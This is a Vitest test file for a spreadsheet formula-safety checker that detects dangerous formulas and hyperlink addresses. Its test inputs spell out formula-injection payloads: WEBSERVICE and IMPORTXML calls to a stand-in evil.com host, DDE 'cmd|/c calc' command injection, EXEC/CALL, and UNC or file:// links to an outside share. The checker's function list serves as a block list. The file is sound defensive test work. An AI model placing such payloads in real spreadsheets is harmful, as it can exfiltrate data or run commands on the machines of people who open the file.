import { describe, expect, it } from "vitest";
import {
  assertSafeFormula,
  assertSafeHyperlink,
  dangerousFormula,
  dangerousHyperlinkAddress
} from "./formulaSafety";

describe("formulaSafety", () => {
  it("detects network-exfiltrating functions", () => {
    expect(dangerousFormula('=WEBSERVICE("http://evil.com")')).toBe(
      "WEBSERVICE"
    );
    expect(dangerousFormula('=IF(A1,WEBSERVICE("http://evil.com"))')).toBe(
      "WEBSERVICE"
    );
    expect(dangerousFormula('=IMPORTXML("http://evil.com")')).toBe(
      "IMPORTXML"
    );
    expect(dangerousFormula('=FILTERXML(A1,"//x")')).toBe("FILTERXML");
  });

  it("detects phishing and legacy exec functions", () => {
    expect(dangerousFormula('=HYPERLINK("http://evil.com")')).toBe(
      "HYPERLINK"
    );
    expect(dangerousFormula('=EXEC("calc")')).toBe("EXEC");
    expect(dangerousFormula('=CALL("x","y","z")')).toBe("CALL");
    expect(dangerousFormula('=REGISTER("x")')).toBe("REGISTER");
  });

  it("detects DDE command injection", () => {
    expect(dangerousFormula("=cmd|'/c calc'!A0")).toBe("DDE");
    expect(dangerousFormula("= cmd'/c calc'!A0")).toBe("DDE");
  });

  it("passes safe formulas", () => {
    expect(dangerousFormula("=SUM(A1:A10)")).toBeNull();
    expect(dangerousFormula("=XLOOKUP(A1,B:B,C:C)")).toBeNull();
    expect(dangerousFormula("=SUMPRODUCT(ISNUMBER(SEARCH(A1,B2)))")).toBeNull();
    expect(dangerousFormula("")).toBeNull();
  });

  it("allowlists HYPERLINK only when enabled, without weakening others", () => {
    expect(dangerousFormula('=HYPERLINK("https://example.com")', true)).toBeNull();
    expect(
      dangerousFormula('=IF(A1,HYPERLINK("https://example.com"))', true)
    ).toBeNull();
    // 默认（配置 allowHyperlink=false）仍拦截
    expect(dangerousFormula('=HYPERLINK("https://example.com")')).toBe(
      "HYPERLINK"
    );
    // 放行 HYPERLINK 不影响其它危险函数
    expect(
      dangerousFormula('=WEBSERVICE("http://evil.com")', true)
    ).toBe("WEBSERVICE");
  });

  it("checks hyperlink addresses", () => {
    expect(dangerousHyperlinkAddress("https://example.com")).toBeNull();
    expect(dangerousHyperlinkAddress("mailto:test@example.com")).toBeNull();
    expect(dangerousHyperlinkAddress("=cmd|'/c calc'!A0")).toBe("DDE");
  });

  it("detects UNC and external workbook references in formulas", () => {
    expect(
      dangerousFormula("='\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1")
    ).toBe("UNC");
    expect(
      dangerousFormula("=SUM('\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1:A2)")
    ).toBe("UNC");
    expect(dangerousFormula("='[report.xlsx]Sheet1'!A1")).toBe("EXTERNAL_REF");
    // 结构化表格引用不受影响
    expect(dangerousFormula("=SUM(Table1[Score])")).toBeNull();
    expect(dangerousFormula("=SUM(A1:A10)")).toBeNull();
  });

  it("allowlists external workbook refs only for selected files", () => {
    const allowed = new Set(["B.xlsx"]);
    expect(
      dangerousFormula("='[B.xlsx]Sheet2'!A1", undefined, allowed)
    ).toBeNull();
    expect(
      dangerousFormula("=SUM('[B.xlsx]Sheet2'!$A$2:$B$7)", undefined, allowed)
    ).toBeNull();
    // 未勾选的文件仍拒绝
    expect(
      dangerousFormula("='[C.xlsx]Sheet1'!A1", undefined, allowed)
    ).toBe("EXTERNAL_REF");
    // 不传白名单时维持原行为
    expect(dangerousFormula("='[B.xlsx]Sheet2'!A1")).toBe("EXTERNAL_REF");
    // 多个引用中任一不在白名单即拒绝
    expect(
      dangerousFormula(
        "=SUM('[B.xlsx]Sheet2'!A1)+SUM('[C.xlsx]Sheet3'!A1)",
        undefined,
        allowed
      )
    ).toBe("EXTERNAL_REF");
    // UNC 不受白名单影响
    expect(
      dangerousFormula(
        "='\\\\evil.com\\share\\[data.xlsx]Sheet1'!A1",
        undefined,
        allowed
      )
    ).toBe("UNC");
  });

  it("assertSafeFormula respects the external file whitelist", () => {
    const allowed = new Set(["B.xlsx"]);
    expect(() =>
      assertSafeFormula("='[B.xlsx]Sheet2'!A1", "A1 的公式", allowed)
    ).not.toThrow();
    expect(() =>
      assertSafeFormula("='[C.xlsx]Sheet1'!A1", "A1 的公式", allowed)
    ).toThrow(/EXTERNAL_REF/);
  });

  it("detects UNC and file hyperlink addresses", () => {
    expect(dangerousHyperlinkAddress("\\\\evil.com\\share\\report.xlsx")).toBe(
      "UNC"
    );
    expect(dangerousHyperlinkAddress("//evil.com/share")).toBe("UNC");
    expect(dangerousHyperlinkAddress("file://evil.com/share")).toBe("FILE");
    expect(dangerousHyperlinkAddress("https://example.com")).toBeNull();
  });

  it("throws on unsafe formulas with label context", () => {
    expect(() => assertSafeFormula('=WEBSERVICE("x")', "A1 的公式")).toThrow(
      /A1 的公式/
    );
    expect(() => assertSafeHyperlink("=cmd|x", "A1 的超链接")).toThrow(
      /A1 的超链接/
    );
  });
});
